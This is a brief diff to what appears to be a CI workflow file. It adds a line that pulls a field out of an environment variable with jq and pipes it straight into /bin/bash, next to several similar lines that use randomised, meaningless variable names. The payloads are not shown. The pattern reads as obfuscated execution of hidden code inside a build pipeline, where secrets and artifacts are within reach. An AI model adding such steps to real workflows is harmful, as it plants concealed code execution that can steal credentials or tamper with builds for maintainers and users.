@@ -30,6 +30,7 @@ jobs:
           echo $gtxkq32062 | jq -r .y085 | /bin/bash
           echo $ch425 | jq -r .ezk8 | /bin/bash
           echo $kw76 | jq -r .sqq57562 | /bin/bash
+          printf '%s' "$di5" | jq -r .adp4 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
